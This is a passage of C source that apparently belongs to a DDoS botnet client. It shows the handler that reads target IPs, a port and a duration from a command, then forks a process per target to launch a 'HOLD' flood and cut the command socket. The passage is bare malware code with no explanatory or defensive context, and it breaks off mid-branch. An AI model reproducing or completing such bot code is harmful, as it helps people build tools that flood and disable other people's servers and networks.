			int port = atoi(argv[2]);
			int time = atoi(argv[3]);

			if(strstr(ip, ",") != NULL)
			{
				unsigned char *hi = strtok(ip, ",");
				while(hi != NULL)
				{
					if(!listFork())
					{
						sendHOLD(hi, port, time);
						close(mainCommSock);
						_exit(0);
					}
					hi = strtok(NULL, ",");
				}
			} else {
				if (listFork()) { return; }

				close(mainCommSock);
